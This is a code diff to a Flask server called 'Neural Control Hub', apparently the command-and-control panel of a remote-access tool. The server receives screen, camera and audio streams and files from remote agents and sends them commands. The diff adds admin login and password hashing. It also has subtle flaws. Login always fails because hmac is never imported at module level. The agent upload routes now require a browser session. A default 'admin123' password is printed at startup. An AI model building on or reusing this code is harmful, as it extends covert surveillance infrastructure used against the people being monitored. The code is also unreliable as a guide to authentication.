@@ -1,7 +1,7 @@
 import eventlet
 eventlet.monkey_patch()
 
-from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
+from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, session, flash
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from collections import defaultdict
 import datetime
@@ -9,10 +9,517 @@ import time
 import os
 import base64
 import queue
+import hashlib
+import secrets
+import os
+import base64
 
+# Configuration Management
+class Config:
+    """Configuration class for Neural Control Hub"""
+    
+    # Admin Authentication
+    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')
+    
+    # Flask Configuration
+    SECRET_KEY = os.environ.get('SECRET_KEY', None)
+    
+    # Server Configuration
+    HOST = os.environ.get('HOST', '0.0.0.0')
+    PORT = int(os.environ.get('PORT', 8080))
+    
+    # Security Settings
+    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
+    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
+    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
+    
+    # Password Security Settings
+    SALT_LENGTH = 32  # Length of salt in bytes
+    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2
+
+# Initialize Flask app with configuration
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'your_secret_key_here'  # Change this to a random secret key
+app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
 socketio = SocketIO(app, async_mode='eventlet')
+
+# Security Configuration and Password Management
+def generate_salt():
+    """Generate a cryptographically secure salt"""
+    return secrets.token_bytes(Config.SALT_LENGTH)
+
+def hash_password(password, salt=None):
+    """
+    Hash a password using PBKDF2 with SHA-256
+    
+    Args:
+        password (str): The password to hash
+        salt (bytes, optional): Salt to use. If None, generates a new salt
+    
+    Returns:
+        tuple: (hashed_password, salt) where both are base64 encoded strings
+    """
+    if salt is None:
+        salt = generate_salt()
+    elif isinstance(salt, str):
+        salt = base64.b64decode(salt)
+    
+    # Use PBKDF2 with SHA-256 for secure password hashing
+    import hashlib
+    import hmac
+    
+    # Create the hash using PBKDF2
+    hash_obj = hashlib.pbkdf2_hmac(
+        'sha256',
+        password.encode('utf-8'),
+        salt,
+        Config.HASH_ITERATIONS
+    )
+    
+    # Return base64 encoded hash and salt
+    return base64.b64encode(hash_obj).decode('utf-8'), base64.b64encode(salt).decode('utf-8')
+
+def verify_password(password, stored_hash, stored_salt):
+    """
+    Verify a password against a stored hash and salt
+    
+    Args:
+        password (str): The password to verify
+        stored_hash (str): The stored hash (base64 encoded)
+        stored_salt (str): The stored salt (base64 encoded)
+    
+    Returns:
+        bool: True if password matches, False otherwise
+    """
+    try:
+        # Hash the provided password with the stored salt
+        hash_obj, _ = hash_password(password, stored_salt)
+        return hmac.compare_digest(hash_obj, stored_hash)
+    except Exception:
+        return False
+
+def create_secure_password_hash(password):
+    """
+    Create a secure hash for a password
+    
+    Args:
+        password (str): The password to hash
+    
+    Returns:
+        tuple: (hash, salt) both base64 encoded
+    """
+    return hash_password(password)
+
+# Generate secure hash for admin password
+ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)
+
+# Session management and security tracking
+LOGIN_ATTEMPTS = {}  # Track failed login attempts by IP
+
+def is_authenticated():
+    """Check if user is authenticated and session is valid"""
+    if not session.get('authenticated', False):
+        return False
+    
+    # Check session timeout
+    login_time = session.get('login_time')
+    if login_time:
+        try:
+            login_datetime = datetime.datetime.fromisoformat(login_time.replace('Z', '+00:00'))
+            current_time = datetime.datetime.now(datetime.timezone.utc)
+            if (current_time - login_datetime).total_seconds() > Config.SESSION_TIMEOUT:
+                session.clear()
+                return False
+        except:
+            session.clear()
+            return False
+    
+    return True
+
+def is_ip_blocked(ip):
+    """Check if IP is blocked due to too many failed login attempts"""
+    if ip in LOGIN_ATTEMPTS:
+        attempts, last_attempt = LOGIN_ATTEMPTS[ip]
+        if attempts >= Config.MAX_LOGIN_ATTEMPTS:
+            # Check if lockout period has passed
+            if (datetime.datetime.now() - last_attempt).total_seconds() < Config.LOGIN_TIMEOUT:
+                return True
+            else:
+                # Reset attempts after timeout
+                del LOGIN_ATTEMPTS[ip]
+    return False
+
+def record_failed_login(ip):
+    """Record a failed login attempt for an IP"""
+    if ip in LOGIN_ATTEMPTS:
+        attempts, _ = LOGIN_ATTEMPTS[ip]
+        LOGIN_ATTEMPTS[ip] = (attempts + 1, datetime.datetime.now())
+    else:
+        LOGIN_ATTEMPTS[ip] = (1, datetime.datetime.now())
+
+def clear_login_attempts(ip):
+    """Clear failed login attempts for an IP after successful login"""
+    if ip in LOGIN_ATTEMPTS:
+        del LOGIN_ATTEMPTS[ip]
+
+def require_auth(f):
+    """Decorator to require authentication for routes"""
+    def decorated_function(*args, **kwargs):
+        if not is_authenticated():
+            return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    decorated_function.__name__ = f.__name__
+    return decorated_function
+
+# Login route
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    client_ip = request.remote_addr
+    
+    # Check if IP is blocked
+    if is_ip_blocked(client_ip):
+        remaining_time = Config.LOGIN_TIMEOUT - (datetime.datetime.now() - LOGIN_ATTEMPTS[client_ip][1]).total_seconds()
+        flash(f'Too many failed login attempts. Please try again in {int(remaining_time)} seconds.', 'error')
+        return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Neural Control Hub - Login Blocked</title>
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+        <style>
+            :root {
+                --primary-bg: #0a0a0f;
+                --secondary-bg: #1a1a2e;
+                --accent-blue: #00d4ff;
+                --accent-purple: #6c5ce7;
+                --accent-red: #ff4757;
+                --text-primary: #ffffff;
+                --text-secondary: #a0a0a0;
+                --glass-bg: rgba(255, 255, 255, 0.05);
+                --glass-border: rgba(255, 255, 255, 0.1);
+            }
+            
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: 'Inter', sans-serif;
+                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
+                color: var(--text-primary);
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            
+            .login-container {
+                background: var(--glass-bg);
+                backdrop-filter: blur(20px);
+                border: 1px solid var(--glass-border);
+                border-radius: 20px;
+                padding: 40px;
+                width: 100%;
+                max-width: 400px;
+                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+                text-align: center;
+            }
+            
+            .login-header h1 {
+                font-family: 'Orbitron', monospace;
+                font-size: 2rem;
+                font-weight: 900;
+                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+                margin-bottom: 20px;
+            }
+            
+            .error-message {
+                background: rgba(255, 71, 87, 0.2);
+                color: var(--accent-red);
+                border: 1px solid var(--accent-red);
+                border-radius: 8px;
+                padding: 20px;
+                margin-bottom: 20px;
+                font-weight: 500;
+            }
+            
+            .retry-btn {
+                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+                border: none;
+                border-radius: 8px;
+                padding: 12px 24px;
+                color: white;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                text-decoration: none;
+                display: inline-block;
+                margin-top: 20px;
+            }
+            
+            .retry-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <div class="login-header">
+                <h1>NEURAL CONTROL HUB</h1>
+            </div>
+            
+            <div class="error-message">
+                <h3>🔒 Access Temporarily Blocked</h3>
+                <p>Too many failed login attempts detected.</p>
+                <p>Please wait before trying again.</p>
+            </div>
+            
+            <a href="/login" class="retry-btn">Try Again</a>
+        </div>
+    </body>
+    </html>
+    '''
+    
+    if request.method == 'POST':
+        password = request.form.get('password', '')
+        
+        # Verify password using secure hash comparison
+        if verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
+            # Successful login
+            clear_login_attempts(client_ip)
+            session['authenticated'] = True
+            session['login_time'] = datetime.datetime.utcnow().isoformat()
+            session['login_ip'] = client_ip
+            return redirect(url_for('dashboard'))
+        else:
+            # Failed login
+            record_failed_login(client_ip)
+            attempts = LOGIN_ATTEMPTS.get(client_ip, (0, None))[0]
+            remaining_attempts = Config.MAX_LOGIN_ATTEMPTS - attempts
+            
+            if remaining_attempts > 0:
+                flash(f'Invalid password. {remaining_attempts} attempts remaining.', 'error')
+            else:
+                flash(f'Too many failed attempts. Please wait {Config.LOGIN_TIMEOUT} seconds.', 'error')
+    
+    return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Neural Control Hub - Login</title>
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+        <style>
+            :root {
+                --primary-bg: #0a0a0f;
+                --secondary-bg: #1a1a2e;
+                --accent-blue: #00d4ff;
+                --accent-purple: #6c5ce7;
+                --text-primary: #ffffff;
+                --text-secondary: #a0a0a0;
+                --glass-bg: rgba(255, 255, 255, 0.05);
+                --glass-border: rgba(255, 255, 255, 0.1);
+            }
+            
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: 'Inter', sans-serif;
+                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
+                color: var(--text-primary);
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            
+            .login-container {
+                background: var(--glass-bg);
+                backdrop-filter: blur(20px);
+                border: 1px solid var(--glass-border);
+                border-radius: 20px;
+                padding: 40px;
+                width: 100%;
+                max-width: 400px;
+                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            }
+            
+            .login-header {
+                text-align: center;
+                margin-bottom: 30px;
+            }
+            
+            .login-header h1 {
+                font-family: 'Orbitron', monospace;
+                font-size: 2rem;
+                font-weight: 900;
+                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+                margin-bottom: 10px;
+            }
+            
+            .login-header p {
+                color: var(--text-secondary);
+                font-size: 0.9rem;
+            }
+            
+            .form-group {
+                margin-bottom: 20px;
+            }
+            
+            .form-group label {
+                display: block;
+                margin-bottom: 8px;
+                color: var(--text-secondary);
+                font-weight: 500;
+            }
+            
+            .form-group input {
+                width: 100%;
+                background: var(--secondary-bg);
+                border: 1px solid var(--glass-border);
+                border-radius: 8px;
+                padding: 12px 16px;
+                color: var(--text-primary);
+                font-size: 1rem;
+                transition: all 0.3s ease;
+            }
+            
+            .form-group input:focus {
+                outline: none;
+                border-color: var(--accent-blue);
+                box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
+            }
+            
+            .login-btn {
+                width: 100%;
+                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+                border: none;
+                border-radius: 8px;
+                padding: 12px;
+                color: white;
+                font-weight: 600;
+                font-size: 1rem;
+                cursor: pointer;
+                transition: all 0.3s ease;
+            }
+            
+            .login-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
+            }
+            
+            .error-message {
+                background: rgba(255, 71, 87, 0.2);
+                color: #ff4757;
+                border: 1px solid #ff4757;
+                border-radius: 8px;
+                padding: 12px;
+                margin-bottom: 20px;
+                text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <div class="login-header">
+                <h1>NEURAL CONTROL HUB</h1>
+                <p>Admin Authentication Required</p>
+            </div>
+            
+            {% with messages = get_flashed_messages(with_categories=true) %}
+                {% if messages %}
+                    {% for category, message in messages %}
+                        <div class="error-message">{{ message }}</div>
+                    {% endfor %}
+                {% endif %}
+            {% endwith %}
+            
+            <form method="POST">
+                <div class="form-group">
+                    <label for="password">Admin Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit" class="login-btn">Access Dashboard</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    '''
+
+# Logout route
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('login'))
+
+# Configuration status endpoint (for debugging)
+@app.route('/config-status')
+@require_auth
+def config_status():
+    """Display current configuration status (for debugging)"""
+    return jsonify({
+        'admin_password_set': bool(Config.ADMIN_PASSWORD),
+        'admin_password_length': len(Config.ADMIN_PASSWORD),
+        'secret_key_set': bool(Config.SECRET_KEY),
+        'host': Config.HOST,
+        'port': Config.PORT,
+        'session_timeout': Config.SESSION_TIMEOUT,
+        'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
+        'login_timeout': Config.LOGIN_TIMEOUT,
+        'current_login_attempts': len(LOGIN_ATTEMPTS),
+        'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS],
+        'password_hash_algorithm': 'PBKDF2-SHA256',
+        'hash_iterations': Config.HASH_ITERATIONS,
+        'salt_length': Config.SALT_LENGTH
+    })
+
+# Password change endpoint
+@app.route('/change-password', methods=['POST'])
+@require_auth
+def change_password():
+    """Change the admin password"""
+    global ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT
+    
+    try:
+        data = request.get_json()
+        current_password = data.get('current_password', '')
+        new_password = data.get('new_password', '')
+        
+        # Verify current password
+        if not verify_password(current_password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
+            return jsonify({'success': False, 'message': 'Current password is incorrect'}), 400
+        
+        # Validate new password
+        if len(new_password) < 8:
+            return jsonify({'success': False, 'message': 'New password must be at least 8 characters long'}), 400
+        
+        # Generate new hash for the new password
+        new_hash, new_salt = create_secure_password_hash(new_password)
+        ADMIN_PASSWORD_HASH = new_hash
+        ADMIN_PASSWORD_SALT = new_salt
+        
+        # Update the config (this will persist for the current session)
+        Config.ADMIN_PASSWORD = new_password
+        
+        return jsonify({'success': True, 'message': 'Password changed successfully'}), 200
+        
+    except Exception as e:
+        return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500
 
 # --- Web Dashboard HTML (with Socket.IO) ---
 DASHBOARD_HTML = r'''
@@ -67,6 +574,67 @@ DASHBOARD_HTML = r'''
             z-index: -1;
         }
 
+        .top-bar {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--glass-border);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .top-bar-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px 0;
+        }
+
+        .header h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.5rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+        }
+
+        .header .subtitle {
+            font-size: 1rem;
+            color: var(--text-secondary);
+            font-weight: 300;
+        }
+
+        .logout-btn {
+            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
+            border: none;
+            border-radius: 8px;
+            padding: 8px 16px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .logout-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 71, 87, 0.3);
+        }
+
         .container {
             max-width: 1400px;
             margin: 0 auto;
@@ -75,43 +643,19 @@ DASHBOARD_HTML = r'''
             z-index: 1;
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-            padding: 30px 0;
-        }
-
-        .header h1 {
-            font-family: 'Orbitron', monospace;
-            font-size: 3rem;
-            font-weight: 900;
-            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 10px;
-            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
-        }
-
-        .header .subtitle {
-            font-size: 1.1rem;
-            color: var(--text-secondary);
-            font-weight: 300;
-        }
-
-        .grid {
+        .main-grid {
             display: grid;
             grid-template-columns: 1fr 2fr;
-            gap: 30px;
-            margin-bottom: 30px;
+            gap: 25px;
+            margin-bottom: 25px;
         }
 
         .panel {
             background: var(--glass-bg);
             backdrop-filter: blur(20px);
             border: 1px solid var(--glass-border);
-            border-radius: 20px;
-            padding: 25px;
+            border-radius: 16px;
+            padding: 20px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
             transition: all 0.3s ease;
         }
@@ -206,14 +750,20 @@ DASHBOARD_HTML = r'''
 
         .control-section {
             display: grid;
-            gap: 20px;
+            gap: 16px;
         }
 
         .control-group {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 15px;
-            padding: 20px;
+            background: var(--tertiary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .control-group:hover {
+            border-color: var(--accent-blue);
+            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.1);
         }
 
         .control-header {
@@ -334,6 +884,65 @@ DASHBOARD_HTML = r'''
             border: 1px solid var(--accent-red);
         }
 
+        .config-status {
+            display: grid;
+            gap: 12px;
+        }
+
+        .config-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .config-item:last-child {
+            border-bottom: none;
+        }
+
+        .config-label {
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .config-value {
+            font-family: 'Orbitron', monospace;
+            color: var(--accent-blue);
+            font-size: 0.9rem;
+        }
+
+        .password-management {
+            display: grid;
+            gap: 16px;
+        }
+
+        .password-strength {
+            margin-top: 8px;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .password-weak {
+            background: rgba(255, 71, 87, 0.2);
+            color: var(--accent-red);
+            border: 1px solid var(--accent-red);
+        }
+
+        .password-medium {
+            background: rgba(255, 193, 7, 0.2);
+            color: #ffc107;
+            border: 1px solid #ffc107;
+        }
+
+        .password-strong {
+            background: rgba(0, 255, 136, 0.2);
+            color: var(--accent-green);
+            border: 1px solid var(--accent-green);
+        }
+
         .no-agents {
             text-align: center;
             padding: 40px 20px;
@@ -366,12 +975,21 @@ DASHBOARD_HTML = r'''
 
         /* Responsive Design */
         @media (max-width: 768px) {
-            .grid {
+            .main-grid {
                 grid-template-columns: 1fr;
             }
             
             .header h1 {
                 font-size: 2rem;
+            }
+            
+            .top-bar-content {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .container {
+                padding: 15px;
             }
         }
     </style>
@@ -379,13 +997,18 @@ DASHBOARD_HTML = r'''
 <body>
     <div class="neural-bg"></div>
     
-    <div class="container">
-        <div class="header">
-            <h1>NEURAL CONTROL HUB</h1>
-            <p class="subtitle">Advanced Command & Control Interface</p>
+    <div class="top-bar">
+        <div class="top-bar-content">
+            <div class="header">
+                <h1>NEURAL CONTROL HUB</h1>
+                <p class="subtitle">Advanced Command & Control Interface</p>
+            </div>
+            <a href="/logout" class="logout-btn">Logout</a>
         </div>
-
-        <div class="grid">
+    </div>
+    
+    <div class="container">
+        <div class="main-grid">
             <!-- Agents Panel -->
             <div class="panel">
                 <div class="panel-header">
@@ -490,6 +1113,64 @@ DASHBOARD_HTML = r'''
                 <div class="panel-title">Neural Terminal</div>
             </div>
             <div class="output-terminal" id="output-display">System ready. Awaiting commands...</div>
+        </div>
+
+        <!-- Configuration Status -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon">⚙️</div>
+                <div class="panel-title">System Configuration</div>
+            </div>
+            <div class="config-status" id="config-status">
+                <div class="config-item">
+                    <span class="config-label">Admin Password:</span>
+                    <span class="config-value" id="admin-password-status">Checking...</span>
+                </div>
+                <div class="config-item">
+                    <span class="config-label">Hash Algorithm:</span>
+                    <span class="config-value" id="hash-algorithm">Checking...</span>
+                </div>
+                <div class="config-item">
+                    <span class="config-label">Session Timeout:</span>
+                    <span class="config-value" id="session-timeout">Checking...</span>
+                </div>
+                <div class="config-item">
+                    <span class="config-label">Max Login Attempts:</span>
+                    <span class="config-value" id="max-login-attempts">Checking...</span>
+                </div>
+                <div class="config-item">
+                    <span class="config-label">Blocked IPs:</span>
+                    <span class="config-value" id="blocked-ips">Checking...</span>
+                </div>
+                <button class="btn" onclick="refreshConfigStatus()">Refresh Status</button>
+            </div>
+        </div>
+
+        <!-- Password Management -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon">🔐</div>
+                <div class="panel-title">Password Management</div>
+            </div>
+            <div class="password-management">
+                <div class="control-group">
+                    <div class="control-header">Change Admin Password</div>
+                    <div class="input-group">
+                        <label class="input-label">Current Password</label>
+                        <input type="password" class="neural-input" id="current-password" placeholder="Enter current password">
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">New Password</label>
+                        <input type="password" class="neural-input" id="new-password" placeholder="Enter new password (min 8 chars)">
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">Confirm New Password</label>
+                        <input type="password" class="neural-input" id="confirm-password" placeholder="Confirm new password">
+                    </div>
+                    <button class="btn" onclick="changePassword()">Change Password</button>
+                    <div id="password-change-status" class="status-indicator"></div>
+                </div>
+            </div>
         </div>
 
         <!-- Hidden audio player for streams -->
@@ -672,6 +1353,130 @@ DASHBOARD_HTML = r'''
         document.getElementById('command').addEventListener('keyup', function(event) {
             if (event.key === 'Enter') {
                 issueCommand();
+            }
+        });
+
+        // Configuration status management
+        function refreshConfigStatus() {
+            fetch('/config-status')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('admin-password-status').textContent = 
+                        data.admin_password_set ? `Set (${data.admin_password_length} chars)` : 'Not set';
+                    document.getElementById('hash-algorithm').textContent = 
+                        `${data.password_hash_algorithm} (${data.hash_iterations} iterations)`;
+                    document.getElementById('session-timeout').textContent = 
+                        `${data.session_timeout} seconds`;
+                    document.getElementById('max-login-attempts').textContent = 
+                        data.max_login_attempts.toString();
+                    document.getElementById('blocked-ips').textContent = 
+                        data.blocked_ips.length > 0 ? data.blocked_ips.join(', ') : 'None';
+                })
+                .catch(error => {
+                    console.error('Error fetching config status:', error);
+                    document.getElementById('admin-password-status').textContent = 'Error';
+                    document.getElementById('hash-algorithm').textContent = 'Error';
+                    document.getElementById('session-timeout').textContent = 'Error';
+                    document.getElementById('max-login-attempts').textContent = 'Error';
+                    document.getElementById('blocked-ips').textContent = 'Error';
+                });
+        }
+
+        // Load config status on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            refreshConfigStatus();
+        });
+
+        // Password management functions
+        function changePassword() {
+            const currentPassword = document.getElementById('current-password').value;
+            const newPassword = document.getElementById('new-password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+            const statusDiv = document.getElementById('password-change-status');
+
+            // Validation
+            if (!currentPassword || !newPassword || !confirmPassword) {
+                showPasswordStatus('Please fill in all password fields.', 'error');
+                return;
+            }
+
+            if (newPassword.length < 8) {
+                showPasswordStatus('New password must be at least 8 characters long.', 'error');
+                return;
+            }
+
+            if (newPassword !== confirmPassword) {
+                showPasswordStatus('New passwords do not match.', 'error');
+                return;
+            }
+
+            // Send password change request
+            fetch('/change-password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    current_password: currentPassword,
+                    new_password: newPassword
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showPasswordStatus('Password changed successfully!', 'success');
+                    // Clear form
+                    document.getElementById('current-password').value = '';
+                    document.getElementById('new-password').value = '';
+                    document.getElementById('confirm-password').value = '';
+                    // Refresh config status
+                    refreshConfigStatus();
+                } else {
+                    showPasswordStatus(data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showPasswordStatus('Error changing password: ' + error.message, 'error');
+            });
+        }
+
+        function showPasswordStatus(message, type) {
+            const statusDiv = document.getElementById('password-change-status');
+            statusDiv.style.display = 'block';
+            statusDiv.className = `status-indicator status-${type}`;
+            statusDiv.textContent = message;
+            setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
+        }
+
+        // Password strength indicator
+        function checkPasswordStrength(password) {
+            let strength = 0;
+            if (password.length >= 8) strength++;
+            if (/[a-z]/.test(password)) strength++;
+            if (/[A-Z]/.test(password)) strength++;
+            if (/[0-9]/.test(password)) strength++;
+            if (/[^A-Za-z0-9]/.test(password)) strength++;
+            
+            if (strength < 3) return 'weak';
+            if (strength < 5) return 'medium';
+            return 'strong';
+        }
+
+        // Add password strength indicator
+        document.getElementById('new-password').addEventListener('input', function() {
+            const password = this.value;
+            const strength = checkPasswordStrength(password);
+            const strengthDiv = this.parentNode.querySelector('.password-strength');
+            
+            if (strengthDiv) {
+                strengthDiv.remove();
+            }
+            
+            if (password.length > 0) {
+                const div = document.createElement('div');
+                div.className = `password-strength password-${strength}`;
+                div.textContent = `Password strength: ${strength.charAt(0).toUpperCase() + strength.slice(1)}`;
+                this.parentNode.appendChild(div);
             }
         });
 
@@ -891,9 +1696,12 @@ DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_pa
 
 @app.route("/")
 def index():
-    return redirect(url_for('dashboard'))
+    if is_authenticated():
+        return redirect(url_for('dashboard'))
+    return redirect(url_for('login'))
 
 @app.route("/dashboard")
+@require_auth
 def dashboard():
     return DASHBOARD_HTML
 
@@ -904,6 +1712,7 @@ CAMERA_FRAMES = defaultdict(lambda: None)
 AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 
 @app.route('/stream/<agent_id>', methods=['POST'])
+@require_auth
 def stream_in(agent_id):
     VIDEO_FRAMES[agent_id] = request.data
     return "OK", 200
@@ -917,10 +1726,12 @@ def generate_video_frames(agent_id):
                    b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
 @app.route('/video_feed/<agent_id>')
+@require_auth
 def video_feed(agent_id):
     return Response(generate_video_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route('/camera/<agent_id>', methods=['POST'])
+@require_auth
 def camera_in(agent_id):
     CAMERA_FRAMES[agent_id] = request.data
     return "OK", 200
@@ -936,10 +1747,12 @@ def generate_camera_frames(agent_id):
             break
 
 @app.route('/camera_feed/<agent_id>')
+@require_auth
 def camera_feed(agent_id):
     return Response(generate_camera_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route('/audio/<agent_id>', methods=['POST'])
+@require_auth
 def audio_in(agent_id):
     AUDIO_CHUNKS[agent_id].put(request.data)
     return "OK", 200
@@ -953,6 +1766,7 @@ def generate_audio_stream(agent_id):
         yield q.get()
 
 @app.route('/audio_feed/<agent_id>')
+@require_auth
 def audio_feed(agent_id):
     return Response(generate_audio_stream(agent_id), mimetype='audio/wav')
 
@@ -960,6 +1774,9 @@ def audio_feed(agent_id):
 
 @socketio.on('connect')
 def handle_connect():
+    # Note: Socket.IO doesn't have direct access to Flask session
+    # In a production environment, you'd want to implement proper Socket.IO authentication
+    # For now, we'll allow connections but validate on specific events
     print(f"Client connected: {request.sid}")
 
 @socketio.on('disconnect')
@@ -1152,5 +1969,11 @@ def handle_file_chunk_from_agent(data):
 
 
 if __name__ == "__main__":
-    print("Starting controller with Socket.IO support...")
-    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), debug=False)
+    print("Starting Neural Control Hub with Socket.IO support...")
+    print(f"Admin password: {Config.ADMIN_PASSWORD}")
+    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
+    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
+    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
+    print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
+    print(f"Salt length: {Config.SALT_LENGTH} bytes")
+    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)
